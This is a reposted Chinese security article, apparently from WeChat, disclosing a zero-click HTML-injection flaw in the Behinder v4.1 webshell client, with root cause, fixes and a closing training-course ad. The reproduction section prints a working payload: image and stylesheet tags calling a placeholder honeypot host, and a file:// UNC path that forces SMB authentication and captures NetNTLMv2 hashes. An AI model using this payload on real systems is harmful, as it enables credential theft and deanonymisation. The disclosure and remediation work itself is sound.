---
title: 冰蝎 v4.1 被曝 0‑click 高危漏洞，一连接就被反制，可窃取凭据...！
url: https://mp.weixin.qq.com/s/6LP7Izufmkq20Es7gNFoPw
source: Doonsec's feed
date: 2026-05-16
fetch_date: 2026-05-17T05:42:56.754361
---

# 冰蝎 v4.1 被曝 0‑click 高危漏洞，一连接就被反制，可窃取凭据...！

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/JnmoqeNZZwQ1KjXvyRicO4jAvpMFM39oucM7wd2H0aa0RJk5gr624ajFrbPicz0OVYx8pMWYgkx9PEmpsNwaZvXjLku4Jl8DTksgibTqzya8Ro/0?wx_fmt=jpeg)

# 冰蝎 v4.1 被曝 0‑click 高危漏洞，一连接就被反制，可窃取凭据...！

s2cr3t
s2cr3t

Z2O安全攻防

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

本文是转载自《潇湘信安》，根据 @s2cr3t 师傅在冰蝎 (Behinder) 官方 Github 仓库提交的一个编号为 313 的安全漏洞报告，issues地址如下：

https://github.com/rebeyond/Behinder/issues/313

**漏洞简介**

漏洞编号：GitHub Issue #313

报告时间：2026‑04‑27

**漏洞类型**：客户端 HTML 注入、信息泄露、NTLM 哈希捕获

**危害等级**：高危

**漏洞概述**

冰蝎 v4.1 客户端存在一处高危安全缺陷：

客户端连接WebShell后，服务端返回的`basicInfo`字段为HTML格式，**未经任何过滤直接传入JavaFX WebView.loadContent()渲染**。

即便代码中已执行`setJavaScriptEnabled(false)`禁用JavaScript，**WebKit 仍会自动解析 HTML/CSS 并加载外部资源**（图片、样式表、iframe、file 协议等）。

恶意 WebShell 服务端（蜜罐）可利用此漏洞：

* 1. 连接瞬间**无交互触发**出站 HTTP / SMB 连接
* 2. 窃取操作者**真实IP、主机名、Windows用户名、域名**
* 3. 捕获可离线破解的 **NetNTLMv2 密码哈希**
* 4. 全程 0‑click、无弹窗、无感知

**影响范围**

受影响版本：冰蝎 Behinder v4.1

其他版本：未逐一验证，**只要MainWindowController中在 `WebView.loadContent(basicInfoStr)` 且未做 HTML 过滤即受影响**

**复现步骤（完整可复现）**

**1. 环境准备**

搭建 Python 蜜罐，模拟冰蝎服务端协议（AES/ECB + Base64 + JSON），在 `BasicInfo` 响应中注入恶意 HTML：

```
<img src="http://蜜罐IP:9090/beacon.png" width="1" height="1"><link rel="stylesheet" href="http://蜜罐IP:9090/style.css"><img src="file://蜜罐IP/share/logo.png" width="1" height="1">
```

同时启动：

* HTTP 信标服务（捕获 IP / UA）
* SMB 监听服务（impacket，捕获 NTLM）

### 2. 触发流程

1. 冰蝎客户端连接恶意 WebShell
2. 自动完成 Echo 握手、偏移校准
3. 客户端请求 BasicInfo
4. 服务端返回含恶意 HTML 的加密响应
5. 客户端解密 → Base64解码 → 直接`loadContent`
6. WebView 自动加载外部资源：

+ HTTP 请求 → 泄露真实 IP、UA、语言

+ file:// → 触发 Windows 自动 SMB 认证 → 泄露 NetNTLMv2

全程无需任何点击、无任何提示

3. 实测可捕获数据

```
# HTTP BeaconIP: 192.168.31.56User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/606.1 (KHTML, like Gecko) JavaFX/8.0 Safari/606.1Language: zh-cn,en-us;q=0.8,en;q=0.7
# NetNTLMv2 Hash（hashcat -m 5600 可直接破解）Administrator::PC-20241022AZEN:aaaaaaaaaaaaaaaa:f3bfabebe9ac...:<blob>
```

![](https://mmbiz.qpic.cn/mmbiz_png/tNyBeBKReNJvtwR1sCWdThsBF3J5L4QyNWaw4FlhxWhe1Jo77ra9A2XBJ5tuM4mIoPfE8z4NTm9K7P0icm7Aw8KoeuPHR80TNrzHdAeqkEtU/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=0)

**漏洞根本原因**

1. setJavaScriptEnabled(false) 只禁 JS，不禁 HTML/CSS 解析、不禁外部资源加载
2. WebKit 会自动请求 <img src>、<link href>、file:// 等资源
3. basicInfoStr 从服务端完全可控，解密后直接渲染，无任何过滤
4. file:// 会被转为 UNC 路径，触发系统级 SMB 认证

完整数据流

* 服务端加密响应 → AES解密 → JSON解析 → Base64解码basicInfo →直接loadContent (原始HTML) → WebKit加载外部资源 → HTTP出站（泄露IP/UA） + SMB认证（泄露NetNTLMv2）

**涉及代码位置**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/tNyBeBKReNKO3MlIO3oicENZZnKzAunBQfsf8PlHp20nx6eXdAscibs50CbUpPbsldiaIDjs4awAxDrETbFicu0QpiaUkkBJ8iaIpPHGRGSUPFfwA/640?wx_fmt=png&from=appmsg&watermark=1#imgIndex=1)

**官方建议修复方案**

方案一：HTML 白名单过滤（最小改动）

在 `loadContent` 前对 `basicInfoStr` 做标签与属性清洗：

```
String sanitized = basicInfoStr    .replaceAll("<(?!br|/br|font|/font|b|/b|i|/i)[^>]*>", "")    .replaceAll("(?i)(src|href|data|background|style)\\s*=", "");webengine.loadContent(sanitized);
```

方案二：改用纯文本渲染（推荐）

彻底弃用WebView，用TextArea/Label纯文本展示：

```
TextArea infoArea = new TextArea();infoArea.setEditable(false);infoArea.setText(basicInfoStr.replaceAll("<[^>]*>", ""));
```

方案三：深度加固（保留 WebView）

1. 拦截http://、https://、file://、ftp://等外部协议

2. 配置严格CSP：default-src 'none'; style-src 'unsafe-inline'

**关键说明**

* 攻击前提：恶意服务端知道通信密码（蜜罐 / 反制场景天然满足）
* 利用难度：极低，PoC 完整可用
* 危害：可直接定位操作者真实身份、获取密码哈希、横向入侵内网
* 披露原则：负责任披露，无 0day 公开扩散

**应急建议（用户侧）**

* 立即**停止使用 v4.1 连接不明 WebShell**
* 等待官方更新或自行打补丁
* 连接前校验服务端可信，避免连接蜜罐
* 本机启用强密码、开启 LSA 保护，降低 NTLM 泄露危害

**关注我们**

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1#imgIndex=2) 还在等什么？赶紧点击下方名片开始学习吧 ![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1#imgIndex=3)

---

**下面是一则内部学习圈广告😜**

**别着急退，看完的师傅们有福了/doge**

欢迎师傅们加入内部网络安全学习圈子。圈子提供三大板块的内容：

**1**

**网络安全0→1学习路径**

![图片](https://mmbiz.qpic.cn/mmbiz_png/dGCYMHZUKeFyRPgswYHs24iaP9QSZr6Of35ichXI6icv5WergQUcNjojdNRRp9CeibzvQHPPNNsxL6aaqVJ8gjQaqA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1)

1. 完整的「30+周安全学习任务路线图」公开，每周任务明确，清晰的学习重点和目标，从入门到进阶，由浅入深，循序渐进；
2. 学习内容涵盖：

* 常见的Web漏洞原理与利用
* 业务逻辑漏洞挖掘
* SRC实战技巧
* WAF绕过、代码审计、免杀钓鱼
* 内网渗透

  （Linux&Windows）提权与权限维持
* 隧道代理、域渗透、云安全、AI安全

3. 每周发布学习任务+参考资料+建议，学员可自主学习+实战练习；

**2**

**SRC漏洞专项挖掘**

![图片](https://mmbiz.qpic.cn/mmbiz_png/dGCYMHZUKeFyRPgswYHs24iaP9QSZr6Of35ichXI6icv5WergQUcNjojdNRRp9CeibzvQHPPNNsxL6aaqVJ8gjQaqA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2)

1. SRC漏洞知识库持续更新；
2. SRC挖掘技巧、分析方法、视频教程打包；
3. 分享优质挖矿案例，降低上手门槛，教你赚赏金。

**3**

**常态化内容更新**

![图片](https://mmbiz.qpic.cn/mmbiz_png/dGCYMHZUKeFyRPgswYHs24iaP9QSZr6Of35ichXI6icv5WergQUcNjojdNRRp9CeibzvQHPPNNsxL6aaqVJ8gjQaqA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3)

日常分享优质学习资源与攻防渗透技巧，包括但不限于：

1. 红队/蓝队安全攻防、免杀、钓鱼技巧、攻防渗透tips；
2. 学习路线推荐，教程、方法、技巧tips打包分享，实战视频、工具、手册一应俱全；
3. 根据网络安全初中级学习者水平，精选最有用的内容，不让你在信息洪流中迷路。

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/h8P1KUHOKuYnqBadHPfYribO0Eh7AO6sZtibP7icnEL1CIv2ibPnlUibbBzpK1lImaQsiawxpEKD4wOE3B9tBMll0HBg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=81)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HaJr68L1tTSb1XKYzBaSZ12svUicannzD6B7ialvhZB0XJtGrrSiawmjIhv4ZRW4gTvdhQ1MkSTNvv530EOqSfKBQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5)

![图片](https://mmbiz.qpic.cn/mmbiz_png/HaJr68L1tTSb1XKYzBaSZ12svUicannzDQL6MIsF3Yqiczbczx67Z76BjgaXGGn8anlibtj82icib29ZyuuP3N7s9gw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=8)

![Image](https://mmbiz.qpic.cn/mmbiz_png/JnmoqeNZZwRoUNibnfBZmLRfGTjQRxfgTe2JXSIH8MJvialwFsIEpLL8AJPSuibZw8xf5c11KQMT7WUYetlN8lGnSmVKOzCkoRxpVGgWxFvibPc/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7)

![Image](https://mmbiz.qpic.cn/sz_mmbiz_png/JnmoqeNZZwQuPM1XjBf4yNf97Hv1p16PkWCSSgLDNgEy0TZtbCHHPe7kzAlFsGOIUzPkwhkOUmcVibRfibmfBhREjchZnsGxIuhRhnXBfovp0/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=37)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZq5sEo9xMfOVGAKuZWic3dSmVcRnYRDwbJdF39kiaGOrw5ofgicOs4WUH5PBiaq1MXpYDVbfSlCKJ00g/0?wx_fmt=png)

Z2O安全攻防

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/h8P1KUHOKuZq5sEo9xMfOVGAKuZWic3dSmVcRnYRDwbJdF39kiaGOrw5ofgicOs4WUH5PBiaq1MXpYDVbfSlCKJ00g/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过